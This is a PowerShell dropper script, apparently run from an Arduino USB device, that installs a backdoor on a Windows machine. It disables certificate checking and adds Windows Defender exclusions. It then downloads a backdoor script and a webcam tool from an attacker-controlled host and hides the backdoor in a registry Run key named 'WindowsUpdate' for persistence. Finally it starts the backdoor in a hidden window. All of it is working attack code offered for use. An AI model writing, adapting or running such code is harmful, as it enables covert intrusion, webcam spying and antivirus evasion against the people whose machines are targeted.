# ----- SSL ignore -----
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# ----- Add Windows Defender exclusions -----
Add-MpPreference -ExclusionPath "C:\Users\Public" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue

# ----- GUI Progress Window -----
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Demo Installer'
$form.Size = New-Object System.Drawing.Size(450,150)
$form.StartPosition = 'CenterScreen'
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(20,10)
$label.Size = New-Object System.Drawing.Size(400,20)
$label.Text = 'Starting installation...'
$label.Font = New-Object System.Drawing.Font('Segoe UI',10,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($label)

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(20,50)
$progress.Size = New-Object System.Drawing.Size(400,30)
$progress.Minimum = 0
$progress.Maximum = 100
$form.Controls.Add($progress)

$form.Show()
$form.Refresh()

function Update-Progress {
    param([int]$Percent, [string]$Message)
    $progress.Value = $Percent
    $label.Text = $Message
    $form.Refresh()
    Start-Sleep -Milliseconds 200
}

# ----- Configuration -----
$attacker = '192.168.1.53:8000'   # <-- CHANGE TO YOUR IP
$temp = $env:TEMP
$public = 'C:\Users\Public'

# ----- Download Files -----
Update-Progress 10 'Step 1/6: Downloading backdoor...'
Invoke-WebRequest -Uri "http://$attacker/backdoor.ps1" -OutFile "$public\backdoor.ps1"

Update-Progress 25 'Step 2/6: Downloading webcam tool...'
Invoke-WebRequest -Uri "http://$attacker/cam.exe" -OutFile "$temp\cam.exe"

# ----- Unblock Files -----
Update-Progress 40 'Step 3/6: Unblocking files...'
Unblock-File -Path "$public\backdoor.ps1", "$public\installer.ps1", "$temp\cam.exe" -ErrorAction SilentlyContinue

# ----- Add Persistence (Registry Run Key) - DOUBLE HIDDEN -----
Update-Progress 55 'Step 4/6: Adding persistence...'
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$backdoorPath = "$public\backdoor.ps1"
# Double‑hidden command: start PowerShell hidden, which then starts the backdoor hidden
$regValue = "powershell -WindowStyle Hidden -Command `"Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backdoorPath`"'`""
New-ItemProperty -Path $regPath -Name 'WindowsUpdate' -Value $regValue -PropertyType String -Force | Out-Null

# ----- Start Backdoor (hidden) - DOUBLE HIDDEN -----
Update-Progress 70 'Step 5/6: Starting backdoor...'
$startCmd = "Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backdoorPath`"'"
Invoke-Expression $startCmd

# ----- Finalize -----
Update-Progress 85 'Step 6/6: Finalizing...'
Start-Sleep -Seconds 2
Update-Progress 100 'Installation complete! You may unplug the Arduino.'
Start-Sleep -Seconds 3

$form.Close()
